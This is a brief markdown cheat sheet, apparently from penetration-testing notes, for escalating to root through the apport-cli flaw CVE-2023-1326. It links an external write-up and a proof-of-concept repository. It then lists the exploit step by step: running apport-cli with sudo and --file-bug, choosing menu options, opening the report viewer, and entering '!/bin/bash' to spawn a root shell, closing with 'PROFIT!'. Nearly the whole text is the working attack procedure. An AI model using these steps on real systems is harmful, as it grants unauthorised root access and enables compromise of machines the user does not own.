# Apport-cli Privesc

## Resources: 

### 1) https://vk9-sec.com/cve-2023-1326privilege-escalation-apport-cli-2-26-0/

### 2) https://github.com/diego-tella/CVE-2023-1326-PoC

# With sudo:

## Steps:

#### 1) Check version

    sudo /usr/bin/apport-cli -v 

#### 2) Enter debug mode

    sudo /usr/bin/apport-cli --file-bug 

#### 3) Choose 1

#### 4) Choose 2

#### 5) Press V

#### 6) Enter !/bin/bash to execute an elevated bash shell (Opens a less page as root)

#### 7) PROFIT!
